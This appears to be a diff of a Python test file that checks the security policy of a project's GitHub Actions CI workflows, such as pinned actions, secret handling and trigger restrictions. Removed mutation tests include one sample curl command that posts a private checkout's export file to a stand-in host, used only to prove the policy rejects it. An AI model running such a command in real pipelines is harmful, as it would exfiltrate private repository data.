@@ -953,12 +953,14 @@ _SHARD_DISCOVERY = (
 # repository, reads no secret, starts no container and re-checks out nothing, so
 # it stays admissible under this closed-world contract.
 #
-# The marker filter is byte-for-byte what it has always been. Sharding is a
-# deterministic round-robin over the sorted *tracked* test files, which is why
-# it adds no dependency to uv.lock -- pytest-split or pytest-xdist would each
-# add one, and a new PyPI dependency resolved at CI time in an untrusted
-# workflow is exactly the supply-chain surface this file exists to bound. If a
-# shard ever collects nothing the step fails loudly rather than passing empty.
+# The marker filter deselects the original three markers plus `private_bundle`
+# (CI fetches no model weights); it fails when selected without models/, so the
+# filter is the one place it is left out. Sharding is a deterministic
+# round-robin over the sorted *tracked* test files, which is why it adds no
+# dependency to uv.lock -- pytest-split or pytest-xdist would each add one, and
+# a new PyPI dependency resolved at CI time in an untrusted workflow is exactly
+# the supply-chain surface this file exists to bound. If a shard ever collects
+# nothing the step fails loudly rather than passing empty.
 _TEST_STEPS = [
     _CHECKOUT_STEP,
     _SETUP_UV_STEP,
@@ -990,7 +992,8 @@ _TEST_STEPS = [
             "fi\n"
             'echo "shard $SHARD/$SHARD_TOTAL: ${#shard_files[@]} files"\n'
             "uv run pytest -q -m "
-            '"not real_stack and not heavy and not integration" \\\n'
+            '"not real_stack and not heavy and not integration '
+            'and not private_bundle" \\\n'
             '  "${shard_files[@]}"\n'
         ),
     },
@@ -1832,12 +1835,13 @@ def test_pull_request_secret_policy_allows_a_secret_behind_a_non_pr_job_gate() -
 
 
 def test_pull_request_workflow_discovery_ignores_workflows_without_the_trigger() -> None:
-    # contract-drift.yml reads a private repository with a secret, and is safe
-    # precisely because `pull_request` cannot start it. It must stay outside the
-    # discovered set, or the rules above would be asserting the wrong thing.
-    assert "contract-drift.yml" in _tracked_workflows()
-    assert "contract-drift.yml" not in _pull_request_workflows()
-    assert "pull_request" not in _trigger_names(_workflow("contract-drift.yml"))
+    # release.yml grants `contents: write` and `actions: write` to the job that
+    # creates the GitHub Release, and is safe precisely because `pull_request`
+    # cannot start it. It must stay outside the discovered set, or the rules
+    # above would be asserting the wrong thing.
+    assert "release.yml" in _tracked_workflows()
+    assert "release.yml" not in _pull_request_workflows()
+    assert "pull_request" not in _trigger_names(_workflow("release.yml"))
 
 
 # ---------------------------------------------------------------------------
@@ -2062,157 +2066,3 @@ def test_round_robin_matches_the_awk_indexing() -> None:
     assert partition[2] == ["tests/test_2.py", "tests/test_6.py"]
     assert partition[3] == ["tests/test_3.py", "tests/test_7.py"]
     assert partition[4] == ["tests/test_4.py", "tests/test_8.py"]
-
-
-def _assert_trusted_contract_drift_security(workflow: dict[str, object]) -> None:
-    assert set(workflow) == {"jobs", "name", "on", "permissions"}
-    events = workflow["on"]
-    assert events == {
-        "push": {
-            "branches": ["main"],
-            "paths": [
-                "contracts/**",
-                "tests/test_vendor_drift.py",
-                ".github/workflows/contract-drift.yml",
-            ],
-        }
-    }
-    assert workflow["permissions"] == {"contents": "read"}
-
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    assert set(jobs) == {"verify"}
-    verify = jobs["verify"]
-    assert isinstance(verify, dict)
-    assert set(verify) == {"env", "runs-on", "steps"}
-    assert verify["runs-on"] == "ubuntu-latest"
-    assert verify["env"] == {
-        "DATASET_OPS_REQUIRED": "1",
-        "DATASET_OPS_REPO": "${{ github.workspace }}/.dataset-ops",
-    }
-    steps = verify["steps"]
-    assert isinstance(steps, list)
-    assert steps == [
-        {
-            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
-            "with": {"persist-credentials": "false"},
-        },
-        {
-            "uses": "astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
-            "with": {"enable-cache": "false", "version": "0.11.27"},
-        },
-        {"run": "uv sync --frozen"},
-        {
-            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
-            "with": {
-                "repository": "SeniorAILab/eldercare-dataset-ops",
-                "path": ".dataset-ops",
-                "token": "${{ secrets.DATASET_OPS_TOKEN }}",
-                "persist-credentials": "false",
-                "fetch-depth": "1",
-                "sparse-checkout": "ml/contracts\n",
-                "sparse-checkout-cone-mode": "false",
-            },
-        },
-        {
-            "name": "Verify vendored contracts",
-            "shell": "bash",
-            "run": (
-                "set +e\n"
-                'uv run pytest -q tests/test_vendor_drift.py > "$RUNNER_TEMP/'
-                'contract-drift.log" 2>&1\n'
-                "status=$?\n"
-                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
-                "if (( status != 0 )); then\n"
-                '  echo "::error::Vendored contract drift verification failed; '
-                'details suppressed."\n'
-                '  exit "$status"\n'
-                "fi\n"
-            ),
-        },
-        {
-            "name": "Remove private checkout",
-            "if": "always()",
-            "shell": "bash",
-            "run": (
-                'rm -rf -- "${{ github.workspace }}/.dataset-ops"\n'
-                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
-            ),
-        },
-    ]
-
-
-def test_trusted_contract_drift_workflow_is_non_persistent() -> None:
-    workflow = _workflow("contract-drift.yml")
-    _assert_trusted_contract_drift_security(workflow)
-
-    serialized = yaml.safe_dump(workflow)
-    assert "upload-artifact" not in serialized
-    assert "actions/cache" not in serialized
-
-
-@pytest.mark.parametrize(
-    ("step_index", "field", "value"),
-    [
-        (0, "uses", "actions/checkout@v4"),
-        (1, "uses", "astral-sh/setup-uv@v5"),
-        (4, "run", "curl https://example.invalid --data-binary @.dataset-ops/export"),
-        (5, "if", "success()"),
-    ],
-)
-def test_trusted_contract_policy_rejects_security_mutations(
-    step_index: int, field: str, value: str
-) -> None:
-    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    job = jobs["verify"]
-    assert isinstance(job, dict)
-    steps = job["steps"]
-    assert isinstance(steps, list)
-    steps[step_index][field] = value
-
-    with pytest.raises(AssertionError):
-        _assert_trusted_contract_drift_security(workflow)
-
-
-@pytest.mark.parametrize(
-    ("field", "value"),
-    [
-        ("continue-on-error", "true"),
-        ("if", "false"),
-        ("runs-on", "self-hosted"),
-        ("container", "unreviewed/image:latest"),
-    ],
-)
-def test_trusted_contract_policy_rejects_job_mutations(field: str, value: object) -> None:
-    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    job = jobs["verify"]
-    assert isinstance(job, dict)
-    job[field] = value
-
-    with pytest.raises(AssertionError):
-        _assert_trusted_contract_drift_security(workflow)
-
-
-@pytest.mark.parametrize(
-    ("field", "value"),
-    [
-        ("DATASET_OPS_REQUIRED", "0"),
-        ("DATASET_OPS_REPO", "/tmp/redirected"),
-    ],
-)
-def test_trusted_contract_policy_rejects_environment_mutations(field: str, value: str) -> None:
-    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
-    jobs = workflow["jobs"]
-    assert isinstance(jobs, dict)
-    job = jobs["verify"]
-    assert isinstance(job, dict)
-    environment = job["env"]
-    assert isinstance(environment, dict)
-    environment[field] = value
-
-    with pytest.raises(AssertionError):
-        _assert_trusted_contract_drift_security(workflow)
